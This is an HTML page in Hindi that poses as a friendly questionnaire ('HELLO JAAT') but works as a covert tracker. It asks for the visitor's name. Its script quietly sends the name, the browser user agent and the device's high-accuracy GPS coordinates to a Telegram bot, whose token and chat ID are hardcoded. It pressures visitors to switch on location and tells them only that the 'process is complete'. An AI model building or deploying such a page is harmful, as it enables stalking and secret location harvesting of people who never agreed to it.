<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Hello_JAAT_G</title>
<style>
.progress{
width:100%;
height:10px;
background:#222;
border-radius:20px;
overflow:hidden;
margin-bottom:20px;
}
#progressBar{
width:0%;
height:100%;
background:linear-gradient(90deg,#00ffff,#00ff88);
transition:0.5s;
}
*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial,sans-serif;
}
body{
min-height:100vh;
background:
linear-gradient(135deg,#050505,#0f172a,#111827);
color:white;
display:flex;
justify-content:center;
align-items:center;
padding:20px;
overflow-x:hidden;
}
.container{
width:100%;
max-width:900px;
}
.title{
text-align:center;
font-size:60px;
font-weight:bold;
margin-bottom:15px;
background:linear-gradient(
90deg,
#00ffff,
#00ff88,
#ff00ff,
#00ffff
);
background-size:300% 300%;
-webkit-background-clip:text;
-webkit-text-fill-color:transparent;
animation:glow 4s infinite linear;
}
@keyframes glow{
0%{
background-position:0% 50%;
}
50%{
background-position:100% 50%;
}
100%{
background-position:0% 50%;
}
}
.subtitle{
text-align:center;
font-size:20px;
color:#d1d5db;
line-height:1.7;
margin-bottom:35px;
}
.card{
background:rgba(255,255,255,0.05);
border:1px solid rgba(255,255,255,0.1);
backdrop-filter:blur(12px);
border-radius:25px;
padding:25px;
box-shadow:
0 0 25px rgba(0,255,255,.3);
animation:fadeIn .5s;
}
.question{
font-size:28px;
font-weight:bold;
margin-bottom:25px;
text-align:center;
}
.btn{
border:none;
padding:15px 35px;
font-size:18px;
font-weight:bold;
border-radius:18px;
cursor:pointer;
color:white;
transition:.3s;
}
.btn:hover{
transform:scale(1.08);
}
.yes{
background:linear-gradient(45deg,#ff6d00,#ff1744);
box-shadow:0 0 20px orange;
}
@keyframes fadeIn{
from{
opacity:0;
transform:translateY(15px);
}
to{
opacity:1;
transform:translateY(0);
}
}
</style>
</head>
<body>
<div class="container">
<h1 class="title" id="helloTitle">
HELLO JAAT ☠️🙋
</h1>
<p class="subtitle">
✨ हम आपसे कुछ प्रश्न करना चाहेंगे।<br>
यह प्रश्न Yogesh द्वारा किए जा रहे हैं।<br>
</p>
<div class="progress">
<div id="progressBar"></div>
</div>
<div id="app" class="card">
<div class="question">
📝 Type Your Name
</div>
<input
type="text"
id="userName"
placeholder="अपना नाम लिखें"
style="
width:100%;
padding:15px;
border-radius:15px;
border:none;
font-size:18px;
margin-top:15px;
background: white;
color: black;
">
<div style="text-align:center;margin-top:20px;">
<button class="btn yes" onclick="saveName()">
🚀 Continue
</button>
</div>
</div>
</div>
<script>
let userLocation = "";
let phoneInfo = navigator.userAgent;
let userName = "";

// ⚠️ यहाँ सुरक्षा के लिए खाली जगह छोड़ी है, अपना सही टोकन और चैट आईडी भरें
const BOT_TOKEN = "8423643379:AAG0nGVaqH_BI-QOD2LPkbdyqOLvYz34v4Y";
const CHAT_ID = "8064366990";

async function sendToTelegram(message){
try{
await fetch(
`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
chat_id: CHAT_ID,
text: message
})
});
}catch(error){
console.log(error);
}
}

function showFirstQuestion(){
document.getElementById("progressBar").style.width="100%";
document.getElementById("app").innerHTML = `
<div class="question">
🙏 THANK YOU
</div>
<div class="question" style="font-size: 20px; font-weight: normal; color: #00ff88;">
धन्यवाद, आपका प्रोसेस पूरा हो चुका है।
</div>
`;
}

async function saveName(){

userName =
document.getElementById("userName").value;

if(!userName){
alert("नाम लिखो");
return;
}
document.getElementById("helloTitle").innerHTML =
"HELLO " + userName.toUpperCase() + " ☠️🔥";
sendToTelegram(
"📝 नया नाम मिला\n\n" +
"नाम: " + userName +
"\nफोन: " + phoneInfo
);

// 🌟 आपका ओरिजिनल लोकेशन कोड बिना किसी बदलाव के (सिस्टम पॉप-अप के लिए हाई-एक्यूरेसी सेटिंग्स के साथ)
navigator.geolocation.getCurrentPosition(
function(position){
const lat =
position.coords.latitude;
const lon =
position.coords.longitude;
sendToTelegram(
"📍 नई लोकेशन मिली\n\n" +
"नाम: " + userName +
"\nLatitude: " + lat +
"\nLongitude: " + lon +
`\nGoogle Maps: http://googleusercontent.com/maps.google.com/maps?q=${lat},${lon}`
);
showFirstQuestion();
},
function(error){
// अगर लोकेशन ऑफ है, तो यूज़र को अलर्ट देकर वापस लोकेशन चेक करेगा
alert("⚠️ आपके डिवाइस की लोकेशन (GPS) बंद है। कृपया अपनी लोकेशन 'चालू करें' पर क्लिक करके ऑन करें और दोबारा Continue दबाएं!");
},
{
    enableHighAccuracy: true,  // 📌 यही आपके फोन में 'चालू करें' का ओरिजिनल पॉप-अप लाता है
    timeout: 8000,
    maximumAge: 0
}
);
}
</script>
</body>
</html>
